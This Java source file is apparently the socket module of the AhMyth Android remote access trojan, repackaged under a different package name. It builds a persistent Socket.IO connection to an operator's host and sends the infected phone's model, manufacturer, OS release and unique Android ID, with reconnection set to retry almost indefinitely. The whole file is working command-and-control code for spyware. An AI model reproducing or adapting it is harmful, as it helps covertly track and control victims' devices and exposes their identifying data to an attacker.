package com.king.ahh.abcc.socket;

import android.os.Build;
import android.provider.Settings;
import java.net.URISyntaxException;

import com.king.ahh.abcc.service.MainService;
import io.socket.client.IO;
import io.socket.client.Socket;


/**
 * Created by AhMyth on 10/14/16.
 */
public class IOSocket {
    private static IOSocket ourInstance = new IOSocket();
    private io.socket.client.Socket ioSocket;



    private IOSocket() {
    }


    public static IOSocket getInstance() {
        return ourInstance;
    }

    public Socket getIoSocket() {
        return ioSocket;
    }

    public void initConnect(String host, String port) {
        try {

            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 999999999;
            String url = "http://" + host + ":" + port + "?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID;
            ioSocket = IO.socket(url);
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }




}
